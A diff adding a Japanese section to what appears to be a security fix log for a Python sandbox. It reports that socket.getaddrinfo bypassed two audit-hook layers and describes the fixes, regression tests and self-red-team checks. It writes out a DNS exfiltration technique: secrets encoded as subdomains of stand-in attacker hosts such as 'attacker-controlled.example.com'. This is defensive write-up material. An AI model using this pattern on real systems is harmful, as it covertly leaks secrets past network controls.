@@ -1813,3 +1813,26 @@ python: can't open file '/jail/target.py': [Errno 13] Permission denied
 **検証**: `angels/zerachiel_process_spawn_guard.py`を直接実行し(前述のrsaスタブを用いて)、新設した2件を含む全4件がPASSすることを確認した。`tests/test_zerachiel_process_spawn_guard.py`の全7件を、自作の`FakeMonkeypatch`ハーネスで直接実行し、全てPASSすることを確認した。`angels/jerahmeel_fail_open_guard.py`による正当化コメント漏れの事前チェックも実施済み。本件はコードの修正を伴う変更(新しい検査関数2件の追加)のため、他の§同様、最終的なpytest全件実行の確認はreal CIに委ねる。本件の修正に用いた`rsa`スタブはこのセッションの一時ファイル(`/tmp`配下)のみに存在し、リポジトリには一切コミットしていない。
 
 **real CIでの最終検証**: `ab76a68`のpush後、両ワークフロー(`Sanctuary CI/CD`・`Anjo da máquina Protocol - Angels`)を具体的なrun IDのポーリングで完了まで待ち、両方とも`conclusion: success`であることを確認した(失敗コメント0件)。real CI環境では`rsa`パッケージが正常にインストールされるため、ローカルで使った一時的なダミースタブは一切使われず、本物の`maquina_gatekeeper.py`を通した検証となっている。
+
+### §CT: `socket.getaddrinfo()`によるDNS名前解決そのものが、`connect()`を一切経由しない「DNS exfiltration」として、両方の独立した防御層を完全に素通りしていた
+
+**発見**: §CSで「正直に残していた未検証事項」を解消した直後、同じ徹底棚卸しの精神で`sefer/__init__.py`の`ALWAYS_PASSTHROUGH_AUDIT_EVENTS`(常に無条件で通過させるaudit event名の一覧)を見直した。そこには"socket.getaddrinfo"が、本関数が新設された当初から含まれていた。さらに、`tartarus/armageddon_core.py`の`validate_banned_event()`(§BJ)が、この事実を既に認識し、「raziel_ledger.jsonにどれだけ`socket.getaddrinfo`を追加して人間が承認しても、`_michael_absolute_defense`のソケット検査・デフォルト拒否のいずれでも常に無条件で通過するため、*絶対に*効果が無い」という、まさに「見せかけの保護」を事前に拒否する仕組みまで用意していたことを確認した。
+
+しかし、この判断を支えていた前提――「ホスト名を解決するだけでは、データは一切送出されない」――自体が誤りだった。`socket.getaddrinfo(hostname, ...)`は、`hostname`が数値IPでない限り、OSのDNSリゾルバへ実際に名前解決クエリを送出する。これは「DNS exfiltration」という古典的な技法そのもので、機密データをBase32/Base64等でサブドメインラベルに符号化し、`f"{secret}.attacker-controlled.example.com"`を解決させるだけで、`connect()`を一切行わずに、攻撃者が管理する権威DNSサーバーへ機密データを送出できる。`allowed_hosts`による制限は`connect`/`send`/`sendall`等、接続後の経路のみを対象としており、名前解決そのものは一度もチェックされていなかった。
+
+実機で、`sefer.Sanctum(allowed_hosts={"approved.example.com"})`の内側から、許可されていないホスト名(`f"{secret}.attacker-exfil-example.com"`)で`socket.getaddrinfo()`を呼び出したところ、`LossOfAtaraxia`は一切発生せず、このサンドボックス自身のDNS到達性の欠如によるOSErrorでのみ失敗すること(=Sanctum自体は何も遮断していないこと)を確認した。さらに、`maquina_gatekeeper.py`の独立した別の防御層(`ultimate_audit_hook`、「深層保護」)についても、`forbidden`集合に"socket.getaddrinfo"が一度も含まれておらず、同じ経路が同じように素通りすることを実機で確認した――§CA・§CC・§CEと同じ、「2つの独立した監査フックのうち、片方は気づいていたが実は塞いでおらず、もう片方も気づいていなかった」という構造の非対称性である(ただし今回は両方が同時に未対応だった)。
+
+**たとえ話**: 郵便局の窓口(connect/send)には本人確認を導入したが、「宛先の住所を問い合わせる」という行為自体――つまり電話で「○○という名前の人はどこに住んでいますか」と聞くだけの行為――には誰も気づいていなかった。しかも、その問い合わせの文言自体に、聞きたい名前(機密データ)をそのまま埋め込んで聞けば、電話の相手(攻撃者が管理するDNSサーバー)に直接伝わってしまう。実際に荷物(データ)を送っていなくても、問い合わせの文言そのものが情報漏えいになる。
+
+**原因**: "socket.getaddrinfo"を無条件通過にした当初の設計判断は、「DNS解決は読み取り専用の問い合わせであり、`connect`のような実際のネットワーク送信とは異なる」という、一見合理的だが誤った前提に基づいていた。DNSプロトコルの性質上、クエリの構成要素(ホスト名)自体が外部のネームサーバーへ送信される通信であることが見落とされていた。`tartarus/armageddon_core.py`の§BJの修正は、この誤った前提を「構造的に検証不能」として正当化する安全機構まで作り込んでしまっており、誤った前提が二重に強化されていたことも一因である。
+
+**対応**:
+1. `sefer/__init__.py`の`_michael_absolute_defense`に、"socket.getaddrinfo"専用の検査(「1.5」)を新設した。ホスト名が`None`の場合(`AI_PASSIVE`フラグによるバインド用解決。外部への接続先を一切意味しない)は安全に許可し、それ以外は`allowed_hosts`との一致を要求する――既存の`socket.connect`等のソケット通信検査と全く同じ方針である。
+2. "socket.getaddrinfo"を`ALWAYS_PASSTHROUGH_AUDIT_EVENTS`から除外した。
+3. `maquina_gatekeeper.py`の独立した`forbidden`集合にも"socket.getaddrinfo"を追加した(allowed_hosts方式を持たないブラントな設計のため、こちらは一律遮断)。
+4. `angels/jegudiel_exfiltration_guard.py`(§CA/§CMで同じ「connect不要の送信経路」を検証していた天使)に、両方の防御層(maquina_gatekeeper・sefer.Sanctum)それぞれに対する遮断確認・誤検知防止確認、計4検査を追加した。
+5. `tests/test_armageddon_core.py`の`test_validate_banned_event_rejects_structurally_unenforceable_events`から"socket.getaddrinfo"を除外し(もはや見せかけの保護ではなく、実際に保護されるようになったため)、新規に`validate_banned_event("socket.getaddrinfo")`が`True`を返すことを確認する回帰テストを追加した。
+
+**実装中の自己レッドチーム**: `git stash`で`sefer/__init__.py`の修正のみを一時的に取り消し、`angels/jegudiel_exfiltration_guard.py`を直接実行したところ、新設したsefer.Sanctum側の検査だけが正しく「sefer.Sanctumが遮断せず、実際のOS解決処理まで進んでしまった」としてFAILし(maquina_gatekeeper側の検査は影響を受けずPASSを維持)、`git stash pop`で復元すると全8件がPASSに戻ることを確認した。同様に、`maquina_gatekeeper.py`の`forbidden`集合から"socket.getaddrinfo"のみを一時的に取り除いて同じ非対称な結果(maquina_gatekeeper側だけがFAIL)を確認し、復元してPASSに戻ることも確認した(`git diff --stat`で両ファイルの差分が完全に消えたことまで確認した上で復元)。`tests/test_jegudiel_exfiltration_guard.py`にも、架空の脆弱な検査関数を与えてmaquina_gatekeeper側の退行を再現する回帰テスト(`test_battery_detects_getaddrinfo_regression`)を追加した。
+
+**検証**: 実際にDNSクエリを発行しようとする完全な実攻撃チェーン(Sanctum/深層保護起動前ではなく、起動**中**に、機密データを符号化したホスト名でgetaddrinfo呼び出し→遮断確認)を両方の防御層それぞれで実機再現し、いずれも正しく遮断されることを確認した。許可ホストへの正当な解決、バインド用の`None`解決、Sanctum/深層保護未使用時の正当な解決が、いずれも修正後も正しく成功することを確認した。`angels/jegudiel_exfiltration_guard.py`を直接実行し、新設した4件を含む全8件がPASSすることを確認した。`tests/test_jegudiel_exfiltration_guard.py`・`tests/test_armageddon_core.py`の該当テストを、自作の`FakeMonkeypatch`ハーネスで直接実行し、全てPASSすることを確認した。本件の修正に用いた`rsa`スタブ(§CSで作成したものを再利用)はこのセッションの一時ファイルのみに存在し、リポジトリには一切コミットしていない。`angels/jerahmeel_fail_open_guard.py`による正当化コメント漏れの事前チェックも実施済み。本件の修正を含むpushの最終的なpytest全件実行の確認は、他の§と同じ理由により、real CIに委ねる。
